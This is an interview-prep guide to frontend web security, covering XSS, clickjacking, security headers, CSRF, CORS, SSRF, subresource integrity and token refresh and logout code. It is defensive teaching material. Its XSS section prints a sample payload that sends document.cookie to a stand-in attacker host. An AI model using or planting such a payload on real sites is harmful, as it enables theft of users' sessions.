---
sidebar_label: "Security"
---
# 🔐 Security

---

## 1. 💡 Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is an attack where an attacker injects malicious JavaScript into a web page so that it runs in other users' browsers. It abuses the trust a user has in a website to steal data, hijack sessions, or take actions on the user's behalf. XSS is one of the most common web vulnerabilities, and understanding how to prevent it is crucial for frontend security. For security testing strategies, see [Security Testing](./17-testing.md#7-security-testing).

### 🔹 What is XSS and How It Works

### 🔹 Core idea

* **Untrusted input** is rendered into the page **without proper escaping** - user input gets put directly into HTML

* Browser treats it as **real HTML/JS**, not just text - the browser executes it as code

* Malicious script runs **in the victim's browser** with that site's permissions - attacker's code runs with your site's privileges

### 🔹 Typical flow

1. Attacker finds an input field or URL parameter that is reflected into HTML - finds where user input shows up on the page

2. Injects payload like:

   ```html
   <script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>

   ```

   - This script steals cookies and sends them to the attacker

3. Server or client-side code outputs this directly into the page - your code puts the malicious input into HTML without escaping

4. Browser executes it as normal JavaScript - the browser runs the attacker's code

📌 **In simple terms**: XSS is when user input is treated as code instead of text, so an attacker’s JavaScript runs inside your page.

---

### 🔹 Types of XSS

### 🔹 Reflected XSS

* Payload comes from **request** (query params, form) and is **immediately reflected** in response - user input shows up right away in the page

* Common in search pages, error messages, query string rendering - anywhere user input is shown back to them

### 🔹 Stored XSS

* Payload is **stored on the server** (DB, CMS, comments) - the malicious code gets saved

* Every user who views that content executes the script - everyone who sees it gets attacked

* More dangerous because it scales to many victims - one injection can attack thousands of users

### 🔹 DOM-based XSS

* Vulnerability is entirely in **client-side JavaScript** - the problem is in your frontend code

* JS reads from `location`, `hash`, `innerHTML`, etc. and writes back to DOM unsafely - JavaScript takes user input and puts it into the page without escaping

* No server-side templating is required - this happens entirely in the browser

---

### 🔹 How to Prevent XSS (Frontend Focus)

### 🔹 Escape and sanitize output

* Treat **all user input as untrusted** - assume any user input could be malicious

* Escape special characters before inserting into HTML:
  * `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;` - convert special characters to safe HTML entities

* Use safe APIs:
  * Prefer `textContent`, `innerText`, `setAttribute` for text - these automatically escape content
  * Avoid `innerHTML`, `document.write`, `new Function`, `eval` - these can execute code

### 🔹 Framework best practices

* React/Angular/Vue escape values by default - frameworks protect you automatically

* Only use **dangerous escape hatches** (`dangerouslySetInnerHTML`, `v-html`) when absolutely required - these bypass the protection

* If you must inject HTML, use a **trusted sanitizer** (DOMPurify, etc.) - clean the HTML before injecting it

### 🔹 Security headers

* Use **Content-Security-Policy (CSP)** to restrict where scripts can load from - even if XSS happens, CSP limits what can run

* Disallow inline scripts when possible: `script-src 'self'` - only allow scripts from your own domain

📌 **In simple terms**: Never trust input, never build HTML strings with user data, and use CSP as a safety net.

---

## ⭐ Summary — 10-second Interview Version

> "XSS happens when untrusted input is rendered as HTML/JS and runs in the user's browser. Prevent it by escaping user data, avoiding dangerous APIs like innerHTML, sanitizing rich content, and using CSP to restrict where scripts can come from."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How do you find XSS during development?

Try breaking fields with `<script>alert(1)</script>`, use browser devtools to inspect rendered HTML, and run security linters or scanners.

### How does React help with XSS?

React escapes values by default when rendering, so regular JSX is safe; XSS usually appears only when using `dangerouslySetInnerHTML` or third-party HTML.

---

### 🔹 💡 iframe Protection (Clickjacking)

Clickjacking is a security attack where an attacker embeds your website inside a hidden or disguised `iframe` on their malicious page. When users click on what appears to be a harmless button or element, users are actually clicking on your site's interface without realizing it. This can lead to unauthorized actions like making purchases, changing account settings, or doing social media interactions (likes, shares) on behalf of the user.

---

### 🔹 How Clickjacking Works

1. Attacker creates a page that embeds your site in an `iframe` - puts your site inside their page

2. Uses CSS to make iframe **transparent** or tiny but positions it **under real UI** - hides your site but puts it where users will click

3. User clicks a visible button, but the click lands on the hidden iframe - users think they're clicking one thing but actually clicking your site

4. Your app receives a valid, authenticated click - your site thinks it's a legitimate user action

📌 **In simple terms**: Clickjacking is like putting a fake UI on top of your real website so users click on your buttons without realizing it.

---

### 🔹 Defenses with Headers

### 🔹 X-Frame-Options

* Classic header to control framing:
  * `DENY` – page cannot be displayed in a frame - block all framing
  * `SAMEORIGIN` – only same-origin sites can frame it - only your own site can frame it
  * `ALLOW-FROM uri` – deprecated and poorly supported - don't use this

### 🔹 Content-Security-Policy frame-ancestors

* Modern replacement:
  * `Content-Security-Policy: frame-ancestors 'self' https://trusted.com` - specify exactly who can frame your page

* More flexible and works with CSP ecosystem - better than X-Frame-Options

---

### 🔹 In-App Protections

### 🔹 Frame-busting scripts (fallback)

```javascript
if (window.top !== window.self) {
  window.top.location = window.location;
}

```

* Forces the page to break out of an unwanted frame - JavaScript detects if it's in a frame and breaks out

* Use only as a fallback; rely on headers first - headers are more reliable, this is a backup

### 🔹 UI hardening

* Confirm critical actions with **modals / re-auth / OTP** - make users confirm important actions

* Use **CSRF tokens** so attacker pages cannot forge state-changing requests easily - tokens prevent forged requests

---

## ⭐ Summary — 10-second Interview Version

> "Clickjacking loads your site in a hidden iframe and tricks users into clicking it. Protect against it with `X-Frame-Options` or `CSP frame-ancestors` headers, plus optional frame-busting scripts and confirmations for sensitive actions."

---

## ⭐ Extra Points (If Interviewer Asks More)

### When would you allow framing?

When your app is intentionally embedded (widgets, dashboards, payments) — then restrict framing to trusted domains via `frame-ancestors`.

---

### 🔹 🛡️ Security Headers

Security headers are HTTP response headers that tell the browser to enforce additional security rules. These headers are a low-effort, high-impact way to harden frontend behavior without changing much code - you just configure them once and the browser does the work.

---

### 🔹 🛡️ Important security headers

### 🔹 Content-Security-Policy (CSP)

* Controls where scripts, styles, images, etc. can load from - restricts what resources can be loaded

* Example:

  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com

  ```

  - This says: by default only load from your own domain, but scripts can also come from cdn.example.com

### 🔹 X-Frame-Options / frame-ancestors

* Prevents clickjacking by controlling framing - stops other sites from embedding your page

### 🔹 Strict-Transport-Security (HSTS)

* Forces browser to use HTTPS only:

  ```http
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

  ```

  - Tells browser to always use HTTPS for this site, even if user types HTTP

### 🔹 X-Content-Type-Options

* `nosniff` stops the browser from MIME-sniffing responses - prevents browser from guessing content type, which can be exploited

### 🔹 Referrer-Policy

* Controls how much referrer info is sent to other sites - limits what other sites know about where users came from

### 🔹 Permissions-Policy

* Controls powerful features (camera, geolocation, etc.) - restricts which browser APIs can be used

📌 **In simple terms**: Security headers are configuration switches sent from the server that tell the browser to be more strict and reduce attack surface.

---

### 🔹 💡 Frontend engineer responsibilities

* Know which headers should be enabled for your app

* Coordinate with backend / DevOps to configure them

* Test using browser devtools → **Network** → Response headers

* Use tools like `securityheaders.com` or Lighthouse to audit

---

## ⭐ Summary — 10-second Interview Version

> "Security headers like CSP, HSTS, X-Frame-Options, and X-Content-Type-Options tell the browser to enforce stricter rules. As a frontend engineer, I make sure these headers are configured properly to reduce XSS, clickjacking, mixed content, and other common issues."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How do you roll out CSP safely?

Start with `Content-Security-Policy-Report-Only`, collect violation reports, fix issues, then switch to enforcing mode.

---

### 🔹 🛡️ Client-Side Security

Client-side security is about protecting logic and data that run in the browser. You cannot fully trust the client, but you can make attacks harder and protect users from obvious risks - think of it as defense in depth.

---

### 🔹 💡 Key principles

### 🔹 Never trust the client

* All **authorization, validation, and critical checks** must happen on the server - never trust the client

* Frontend validation is for **UX**, not for security - it makes forms nicer but doesn't protect you

### 🔹 Minimize sensitive data in the browser

* Avoid storing secrets, tokens, or PII in long-lived storage - minimize what sensitive data is in the browser

* Use **short-lived access tokens** and **refresh tokens** with secure cookies - tokens that expire quickly reduce risk

### 🔹 Protect against common attacks

* XSS, CSRF, clickjacking, injection into DOM, open redirects - protect against common frontend attacks

📌 **In simple terms**: Assume the browser is hostile; never rely on it for security decisions and keep sensitive data exposure as small as possible.

---

### 🔹 💡 Practical frontend practices

* Use **HTTPS everywhere** to avoid man-in-the-middle - encrypt all traffic

* Avoid exposing secrets in **bundle, source maps, or env variables** - anything in frontend code is public

* Validate and sanitize user input before display - clean user input before showing it

* Use **secure cookies** for important tokens (`HttpOnly`, `Secure`, `SameSite`) - protect cookies from XSS and CSRF

* Use **feature flags** and **rate limiting** support from backend - let backend control access

---

## ⭐ Summary — 10-second Interview Version

> "Client-side security means never trusting the browser, minimizing sensitive data on the client, and defending against XSS, CSRF, and clickjacking. The frontend supports security but final enforcement always lives on the server."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Can you hide API keys in frontend code?

No. Anything shipped to the browser can be viewed; treat all frontend code as public and keep real secrets on the backend.

---

### 🔹 🌐 Secure Communication (HTTPS)

Secure communication ensures data between browser and server is protected from eavesdropping and tampering. On the web, this mainly means using HTTPS (HTTP over TLS) - it's like wrapping your data in an encrypted tunnel.

---

### 🔹 🌐 What HTTPS provides

### 🔹 Confidentiality

* Data is **encrypted** so attackers on the network cannot read it - even if attackers intercept traffic, these attackers can't understand it

### 🔹 Integrity

* TLS ensures data can't be modified in transit without detection - if someone tries to change the data, you'll know

### 🔹 Authentication

* Certificates prove you're talking to the **real server**, not an impostor - verify you're actually connecting to the right site

📌 **In simple terms**: HTTPS wraps HTTP inside an encrypted tunnel so others on the network can't read or change what you're sending.

---

### 🔹 🌐 Frontend responsibilities for HTTPS

* Always use `https://` URLs for APIs, assets, and links - encrypt everything

* Avoid loading **mixed content** (HTTP resources on HTTPS page) - don't load insecure resources on secure pages

* Support **HSTS** to force HTTPS - tell browsers to always use HTTPS

* Use **WSS** (`wss://`) for secure WebSockets - encrypt WebSocket connections too

* Make sure cookies are marked `Secure` when used over HTTPS - only send cookies over encrypted connections

---

## ⭐ Summary — 10-second Interview Version

> "HTTPS uses TLS to encrypt and authenticate traffic between browser and server. As a frontend engineer I ensure all API calls, assets, and WebSockets use HTTPS/WSS and avoid any mixed-content or insecure links."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Does HTTPS alone stop XSS?

No. HTTPS protects data in transit, not what runs in the browser. You still need CSP, escaping, and sanitization.

---

### 🔹 🛡️ Dependency Security

Dependency security is about ensuring the libraries and packages you use don't introduce vulnerabilities into your application. In modern frontend stacks, most of your code is actually dependencies. For dependency scanning and testing strategies, see Q74. Security Testing.

---

### 🔹 💡 Risks from dependencies

* Known vulnerabilities (XSS, prototype pollution, RCE) - packages with security bugs

* Malicious packages or typosquatting (`react-domm`, `lodashs`) - fake packages with similar names that steal data

* Supply-chain attacks (compromised maintainers or build tools) - attackers compromise legitimate packages

📌 **In simple terms**: Even if your code is safe, a vulnerable or malicious npm package can compromise your entire app.

---

### 🔹 🛡️ How to manage dependency security

* Use **npm audit**, GitHub Dependabot, or similar tools - automatically check for vulnerabilities

* Keep dependencies regularly updated (patch & minor versions) - update when security fixes are released

* Avoid unmaintained or suspicious packages - use packages that are actively maintained

* Lock dependencies with **package-lock.json** or **yarn.lock** - ensure everyone uses the same versions

* Review critical dependencies' popularity and maintenance - check that important packages are trustworthy

---

## ⭐ Summary — 10-second Interview Version

> "Dependency security means continuously monitoring and updating third-party packages so these packages don't introduce vulnerabilities. I rely on tools like npm audit and Dependabot, keep lockfiles up to date, and avoid risky or unmaintained packages."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How do you handle a high-severity vulnerability?

Identify impact, update or patch the package, test regressions, and if needed add temporary mitigations (CSP, feature flags) while working on a full fix.

---

### 🔹 💡 Compliance and Regulations

Compliance ensures your frontend respects legal and industry rules like GDPR, CCPA, PCI-DSS, or HIPAA. While legal teams own requirements, frontend engineers must implement them correctly in UI and data flows.

---

### 🔹 💡 Common compliance themes

* **User consent** (cookies, tracking, marketing) - get permission before collecting data

* **Data minimization** (only collect what you need) - don't collect more than necessary

* **Right to access / delete** (user data controls) - let users see and delete their data

* **Security controls** (encryption, access restrictions) - protect the data you do collect

📌 **In simple terms**: Compliance makes sure we collect, store, and display user data legally and transparently.

---

### 🔹 💡 Frontend responsibilities

* Implement clear **consent banners** and preference centers - make it easy for users to understand and control their data

* Respect user choices (e.g., don't load tracking scripts before consent) - actually follow what users choose

* Provide UI for **data export** and **account deletion** - let users download their data or delete their account

* Avoid logging sensitive data in browser, analytics, or error tools - don't accidentally log passwords or PII

---

## ⭐ Summary — 10-second Interview Version

> "Compliance means building UIs and flows that respect laws like GDPR and CCPA—clear consent, minimal data collection, and easy ways for users to control their data. The legal team defines rules, but frontend must enforce them in practice."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How do you handle cookies under GDPR?

Only set non-essential cookies after explicit consent and give users a way to change their preferences later.

---

### 🔹 ✅ Input Validation and Sanitization

Input validation and sanitization ensure that user-provided data is safe and in the format your system expects. It is one of the first lines of defense against many attacks.

---

### 🔹 ✅ Validation vs sanitization

* **Validation**: Check if data is acceptable (type, length, pattern) - is this input in the right format?

* **Sanitization**: Clean or transform data to a safe form (remove scripts, trim whitespace) - remove dangerous parts

📌 **In simple terms**: Validation decides "Is this input allowed?", sanitization makes "This allowed input safe to use."

---

### 🔹 💡 Frontend and backend roles

* Frontend:
  * Validate for **UX** (instant feedback, better forms) - give users immediate feedback
  * Avoid sending obviously invalid data - catch simple mistakes early

* Backend:
  * Must **re-validate and sanitize** (never trust client) - always check again on the server

---

## ⭐ Summary — 10-second Interview Version

> "Input validation checks that data is correct, and sanitization makes it safe to use. I validate on the frontend for usability but always assume the backend will re-validate and sanitize before storing or using data."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Why can't we rely only on frontend validation?

Because attackers can bypass the UI and send raw HTTP requests; only server-side validation is trustworthy.

---

### 🔹 🖥️ Server-Side Request Forgery (SSRF)

SSRF is an attack where an application makes HTTP requests to arbitrary URLs controlled by an attacker, often allowing access to internal services. While it's mostly a backend issue, frontend designs can influence exposure.

---

### 🔹 🔄 How SSRF happens

* App allows user to specify a URL (webhook, image fetch, URL preview) - user can tell your server to fetch any URL

* Backend fetches that URL **without restrictions** - server blindly fetches whatever URL the user provides

* Attacker points it at `http://localhost:8080/admin` or cloud metadata endpoints - attacker makes your server fetch internal resources

📌 **In simple terms**: SSRF tricks your server into making HTTP calls to places it shouldn't, like your own internal network.

---

### 🔹 ⬇️ ⬇️ Frontend Things to Keep in Mind

* Avoid exposing **raw URL fetch features** unless necessary - don't let users make your server fetch arbitrary URLs

* Validate URLs on the client for obvious issues (scheme, format) - catch obviously bad URLs early

* Collaborate with backend to ensure:
  * Allowlist of domains - only allow fetching from trusted domains
  * Block internal IP ranges and metadata services - prevent access to internal resources

---

## ⭐ Summary — 10-second Interview Version

> "SSRF abuses features where the server fetches user-supplied URLs. I avoid unnecessary 'fetch any URL' features and work with backend to enforce domain allowlists and block internal addresses."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Example of SSRF in a UI feature?

A URL preview feature where the user pastes any link and the server fetches the page to generate a preview.

---

### 🔹 🖥️ Server-Side JavaScript Injection (SSJI)

Server-Side JavaScript Injection (SSJI) occurs when user input is executed as JavaScript on the server (for example, in Node.js templates or eval-like APIs). It can lead to full server compromise.

---

### 🔹 💡 How SSJI works

* Backend uses `eval`, template engines, or dynamic code generation with **user-controlled strings** - server executes user input as code

* Attacker injects payload that breaks out of expected context - attacker's code escapes the intended context

* Code runs with backend privileges - attacker's code runs with full server access

📌 **In simple terms**: SSJI is like XSS but on the server—user input becomes JavaScript that the server executes.

---

### 🔹 💡 Frontend impact

* Avoid designing features that require **server to execute user scripts** - don't design features that need this

* When allowing user templates/config, ensure backend uses:
  * Safe sandboxes - isolate user code so it can't access everything
  * Whitelisting instead of raw evaluation - only allow specific safe operations

---

## ⭐ Summary — 10-second Interview Version

> "SSJI happens when the server executes user-controlled strings as JavaScript. As a frontend engineer I avoid features that require arbitrary scripts on the server and expect backend to use safe templating instead of eval."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Example risky patterns?

Dynamic MongoDB queries built from user strings, or using `eval()` on server to compute expressions sent from the client.

---

### 🔹 💡 Feature Policy / Permissions Policy

Permissions Policy (formerly Feature Policy) is a security header that controls which origins can use powerful browser features like camera, geolocation, fullscreen, and more.

---

### 🔹 💡 What Permissions Policy does

* Allows you to **enable/disable features** per origin or per iframe - control which browser APIs can be used

* Example:

  ```http
  Permissions-Policy: geolocation=(), camera=(), microphone=()

  ```

  → disables these features everywhere - blocks access to location, camera, and microphone

📌 **In simple terms**: It's like a permissions firewall for browser APIs—only allowed origins can use sensitive features.

---

### 🔹 💡 Frontend usage

* Decide which features your app actually needs - only enable what you use

* Disable everything else via header - block everything else by default

* For embedded iframes, use `allow` attribute to grant minimal rights:

  ```html
  <iframe src="..." allow="fullscreen; geolocation">

  ```

  - Only give iframes the permissions these actually need

---

## ⭐ Summary — 10-second Interview Version

> "Permissions Policy allows us to explicitly control which origins can use features like camera or geolocation. We follow least-privilege: enable only what we need and disable everything else."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How is it different from CSP?

CSP controls where resources come from; Permissions Policy controls which browser features and APIs can be used.

---

### 🔹 💡 Subresource Integrity (SRI)

Subresource Integrity (SRI) ensures that external scripts or styles (usually from CDNs) haven't been tampered with. The browser verifies a hash of the resource before executing it.

---

### 🔹 💡 How SRI works

* You add an `integrity` attribute with a hash of the resource content - include a checksum in your HTML

* Browser downloads the file, computes its hash, and compares - browser verifies the file matches the hash

* If hashes don't match, browser **refuses to load it** - if file was modified, browser blocks it

```html
<script src="https://cdn.example.com/app.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>

```

📌 **In simple terms**: SRI is like a checksum for CDN scripts—if someone modifies the file, the browser refuses to run it.

---

### 🔹 💡 When to use SRI

* Any time you load **3rd-party resources** from a CDN (JS, CSS) - protect against CDN compromise

* Especially for critical libraries (React, Angular, analytics) - most important for libraries that have lots of access

---

## ⭐ Summary — 10-second Interview Version

> "Subresource Integrity adds a hash to external script/style tags so the browser can verify these resources weren't changed. It's essential when loading critical libraries from CDNs."

---

## ⭐ Extra Points (If Interviewer Asks More)

### What happens when you update the CDN file?

You must update the SRI hash in your HTML; otherwise the browser will block the new version.

---

### 🔹 💡 Cross-Origin Resource Sharing (CORS)

CORS is a browser security mechanism that controls which origins can make cross-origin HTTP requests and read the responses. It protects users from some kinds of cross-site attacks but must be configured correctly.

---

### 🔹 💡 How CORS works

* Browser sends **Origin** header with cross-origin requests - browser tells server where the request came from

* Server decides whether to allow it via `Access-Control-Allow-Origin` - server says yes or no

* For unsafe methods or headers, browser does a **preflight** (`OPTIONS`) request - browser asks permission first

📌 **In simple terms**: CORS is the browser asking the server "Is this origin allowed to read this response?" and enforcing the answer.

---

### 🔹 ⬇️ ⬇️ Frontend Things to Keep in Mind

* Prefer calling **your own backend** and allow it to talk to third parties - use your backend as a proxy

* Avoid wildcards in production (`Access-Control-Allow-Origin: *`) for authenticated APIs - don't allow all origins for sensitive endpoints

* Understand that CORS is enforced by **browsers**, not by servers alone - browsers block requests, servers just say what's allowed

---

## ⭐ Summary — 10-second Interview Version

> "CORS controls which origins can read cross-origin responses. As a frontend engineer I design APIs so the browser can call them without hacks, and I avoid exposing sensitive endpoints with overly permissive CORS."

---

## ⭐ Extra Points (If Interviewer Asks More)

### Why do tools like Postman not hit CORS errors?

Because CORS is enforced by browsers; Postman is not a browser so it can call any origin directly.

---

### 🔹 💡 Cross-Site Request Forgery (CSRF)

CSRF is an attack where a malicious site tricks a logged-in user's browser into making unwanted requests to another site where the user is authenticated (e.g., changing password, transferring money).

---

### 🔹 💡 How CSRF works

1. User logs into `bank.com` (session cookie stored by browser) - user is authenticated

2. User visits `evil.com` in another tab - user goes to attacker's site

3. `evil.com` submits a form or loads an image that triggers a **state-changing request** to `bank.com` - attacker's site makes a request to your site

4. Browser automatically sends `bank.com` cookies with the request - browser includes the user's session cookie

📌 **In simple terms**: CSRF is when another site silently makes your browser send authenticated requests you didn't intend.

---

### 🔹 💡 Defenses

### 🔹 CSRF tokens

* Server generates a **random token** stored in session - create a unique token for each user session

* Token is included in forms or headers - send the token with every request

* Server verifies token on every state-changing request - check that the token matches before processing

### 🔹 SameSite cookies

* `SameSite=Lax` or `Strict` prevents cookies from being sent on cross-site requests - cookies only sent on same-site requests

### 🔹 Double-submit or custom headers

* For APIs, use custom headers that are hard to forge from third-party sites - browsers block custom headers on cross-site requests

---

## ⭐ Summary — 10-second Interview Version

> "CSRF abuses the browser's automatic cookie sending to perform unwanted actions on behalf of a logged-in user. We defend with CSRF tokens, SameSite cookies, and requiring custom headers for state-changing requests."

---

## ⭐ Extra Points (If Interviewer Asks More)

### How do CSRF tokens work in practice?

The server generates a random token when the user loads a form, stores it in the session, and includes it as a hidden field in the form. When the form is submitted, the server checks that the token matches the session - if it doesn't match or is missing, the request is rejected.

### Why doesn't SameSite=Lax protect against all CSRF?

SameSite=Lax allows cookies on top-level navigations (like clicking a link), so GET requests can still be vulnerable. SameSite=Strict blocks all cross-site cookies but can break legitimate flows where users click links from other sites.

### What's the difference between CSRF and XSS?

XSS runs malicious JavaScript in your site's context, while CSRF tricks the browser into making authenticated requests from another site. XSS can steal data directly; CSRF can only perform actions the user is authorized to do.

---

### 🔹 💡 Access Token and Refresh Token Management

Access tokens and refresh tokens are used together to securely authenticate users without requiring them to log in repeatedly. Access tokens are short-lived and used for API requests, while refresh tokens are long-lived and used to get new access tokens when these expire. Understanding how to manage these tokens properly is crucial for building secure authentication systems.

---

### 🔹 💡 What are Access and Refresh Tokens

### 🔹 Access Token

**Purpose:**

* Short-lived token (usually 15 minutes to 1 hour) - expires quickly for security

* Used to authenticate API requests - proves who you are

* Contains user identity and permissions - has your user info and what you can do

* Sent with every API request - included in every call to the backend

**Characteristics:**

* **Short expiry** - Expires quickly for security

* **Stateless** - Contains all info needed (JWT)

* **Frequent use** - Sent with every request

* **If stolen** - Limited damage (expires soon)

📌 **In simple terms**: Access token is like a day pass - works for a short time, gets you access to resources.

### 🔹 Refresh Token

**Purpose:**

* Long-lived token (days, weeks, or months) - lasts much longer

* Used to get new access tokens - when access token expires, use this to get a new one

* Stored securely (httpOnly cookie or secure storage) - protected from JavaScript access

* Not sent with every request - only used when refreshing access token

**Characteristics:**

* **Long expiry** - Lasts much longer

* **Stored securely** - httpOnly cookie or secure storage

* **Rare use** - Only used to refresh access token

* **If stolen** - More dangerous (can get new access tokens)

📌 **In simple terms**: Refresh token is like a master key - used rarely to get new day passes.

---

### 🔹 💡 Why Use Both Tokens

### 🔹 Security Benefits

**Access Token Short-Lived:**

* If stolen, attacker has limited time - can only use it until it expires

* Even if intercepted, expires quickly - damage is limited

* Reduces damage from token theft - attacker can't use it forever

**Refresh Token Long-Lived:**

* User doesn't need to log in frequently - stays logged in for days or weeks

* Better user experience - users don't get logged out constantly

* Stored more securely (not in localStorage) - protected from XSS attacks

**Separation of Concerns:**

* Access token = daily access - used for actual API calls

* Refresh token = getting new daily access - used to get new access tokens

* Different security levels for different purposes - each token has its own security model

### 🔹 User Experience Benefits

**No Frequent Logins:**

* User logs in once - enter credentials one time

* Access token expires, refresh token gets new one - automatic refresh happens in background

* User stays logged in for days/weeks - seamless experience

**Seamless Experience:**

* App automatically refreshes access token - happens behind the scenes

* User doesn't notice token refresh - no interruption to their workflow

* Feels like always logged in - smooth user experience

---

### 🔹 💡 Token Flow

### 🔹 Initial Login

**Step 1: User Logs In**

* User enters credentials - username and password

* Server validates credentials - checks if login is correct

**Step 2: Server Issues Tokens**

* Server creates access token (short-lived, 15 min) - token for API calls

* Server creates refresh token (long-lived, 7 days) - token for getting new access tokens

* Both tokens sent to client - client receives both tokens

**Step 3: Client Stores Tokens**

* Access token → localStorage or memory (for API requests) - stored where it can be accessed for API calls

* Refresh token → httpOnly cookie or secure storage (more secure) - stored securely, protected from JavaScript

**Response:**

```json
{
  "accessToken": "eyJhbGciOiJIUzI1NiIs...",
  "refreshToken": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": 900 // 15 minutes
}

```

### 🔹 Making API Requests

**Step 1: Client Makes Request**

* Client includes access token in Authorization header - send token with every API call

* `Authorization: Bearer <access_token>` - standard way to send tokens

**Step 2: Server Validates**

* Server checks if access token is valid - verify it's real and not tampered with

* Checks expiry, signature, user permissions - make sure it hasn't expired and user has permission

**Step 3: Request Proceeds**

* If valid → Request succeeds - user gets their data

* If expired → Return 401 Unauthorized - token expired, need to refresh

### 🔹 Access Token Expires

**Step 1: Access Token Expired**

* API request returns 401 Unauthorized - server says token is expired

* Client detects token expired - client knows it needs to refresh

**Step 2: Client Requests New Access Token**

* Client sends refresh token to server - use refresh token to get new access token

* `POST /api/auth/refresh` with refresh token - call refresh endpoint

**Step 3: Server Validates Refresh Token**

* Server checks if refresh token is valid - verify refresh token is real

* Checks if refresh token is revoked/blacklisted - make sure it wasn't logged out

* Checks expiry - make sure refresh token hasn't expired

**Step 4: Server Issues New Tokens**

* If valid → Server issues new access token (and optionally new refresh token) - get new tokens

* If invalid → Return 401, user must log in again - refresh failed, need to login

**Step 5: Client Retries Original Request**

* Client gets new access token - now have fresh token

* Retries original API request with new token - try the original request again

* Request succeeds - this time it works

---

### 🔹 💡 Implementation: Token Refresh Logic

### 🔹 Client-Side Implementation

**Axios Interceptor Approach:**

```javascript
// Axios interceptor to handle token refresh
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and not already retrying
    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Get new access token using refresh token
        const response = await axios.post('/api/auth/refresh', {
          refreshToken: getRefreshToken() // From httpOnly cookie or secure storage
        });

        const { accessToken } = response.data;

        // Store new access token
        setAccessToken(accessToken);

        // Update Authorization header
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;

        // Retry original request
        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed, logout user
        logout();
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);

```

**React Hook Approach:**

```javascript
const useAuth = () => {
  const [accessToken, setAccessToken] = useState(null);
  const [isRefreshing, setIsRefreshing] = useState(false);

  const refreshAccessToken = async () => {
    if (isRefreshing) return; // Prevent multiple refresh calls

    setIsRefreshing(true);
    try {
      const response = await axios.post('/api/auth/refresh', {
        refreshToken: getRefreshToken()
      });
      setAccessToken(response.data.accessToken);
      return response.data.accessToken;
    } catch (error) {
      logout();
      throw error;
    } finally {
      setIsRefreshing(false);
    }
  };

  return { accessToken, refreshAccessToken };
};

```

### 🔹 Server-Side Implementation

**Refresh Token Endpoint:**

```javascript
// POST /api/auth/refresh
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // Check if refresh token is blacklisted (if using blacklist)
    const isBlacklisted = await checkBlacklist(refreshToken);
    if (isBlacklisted) {
      return res.status(401).json({ error: 'Token revoked' });
    }

    // Check if user still exists and is active
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({ error: 'User not found' });
    }

    // Generate new access token
    const newAccessToken = jwt.sign(
      { userId: user.id, email: user.email },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    // Optionally rotate refresh token (security best practice)
    const newRefreshToken = jwt.sign(
      { userId: user.id },
      REFRESH_TOKEN_SECRET,
      { expiresIn: '7d' }
    );

    // Blacklist old refresh token (if using rotation)
    await blacklistToken(refreshToken);

    res.json({
      accessToken: newAccessToken,
      refreshToken: newRefreshToken, // If rotating
      expiresIn: 900 // 15 minutes
    });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

```

---

### 🔹 💡 Logout Implementation

### 🔹 Client-Side Logout

**What to do:**

* Clear access token from memory/localStorage

* Clear refresh token from storage

* Call logout API to invalidate refresh token on server

* Redirect to login page

```javascript
const logout = async () => {
  try {
    // Call logout API to invalidate refresh token on server
    await axios.post('/api/auth/logout', {
      refreshToken: getRefreshToken()
    });
  } catch (error) {
    // Even if API call fails, clear tokens locally
    console.error('Logout error:', error);
  } finally {
    // Clear tokens from client
    localStorage.removeItem('accessToken');
    // Clear refresh token from httpOnly cookie (handled by server)
    // Or clear from secure storage

    // Redirect to login
    window.location.href = '/login';
  }
};

```

### 🔹 Server-Side Logout

**What to do:**

* Blacklist/invalidate refresh token

* Optionally blacklist current access token

* Clear refresh token cookie (if using httpOnly cookie)

```javascript
// POST /api/auth/logout
app.post('/api/auth/logout', async (req, res) => {
  const { refreshToken } = req.body;

  try {
    // Blacklist refresh token (add to blacklist/revoked tokens table)
    await blacklistToken(refreshToken);

    // Clear refresh token cookie
    res.clearCookie('refreshToken');

    res.json({ message: 'Logged out successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Logout failed' });
  }
});

```

---

### 🔹 🛡️ Security Best Practices

### 🔹 Token Storage

**Access Token:**

* **Option 1:** Memory only (most secure, lost on refresh) - safest but user needs to login after page refresh

* **Option 2:** localStorage (convenient, but XSS vulnerable) - easy to use but can be stolen by XSS

* **Option 3:** httpOnly cookie (secure, but CSRF vulnerable) - protected from JavaScript but vulnerable to CSRF

**Refresh Token:**

* **Best:** httpOnly cookie (can't be accessed by JavaScript, XSS safe) - JavaScript can't read it, protects from XSS

* **Alternative:** Secure storage (encrypted, device-specific) - encrypted storage on device

### 🔹 Token Rotation

**Refresh Token Rotation:**

* Issue new refresh token on each refresh - get a new refresh token every time you refresh

* Blacklist old refresh token - mark the old one as invalid

* Prevents token reuse if stolen - if attacker steals old token, it's already invalid

**Benefits:**

* If refresh token stolen, old one becomes useless - attacker can't use stolen token

* Limits damage from token theft - reduces how long attacker can use stolen token

* Better security - more secure than reusing same refresh token

### 🔹 Token Blacklisting

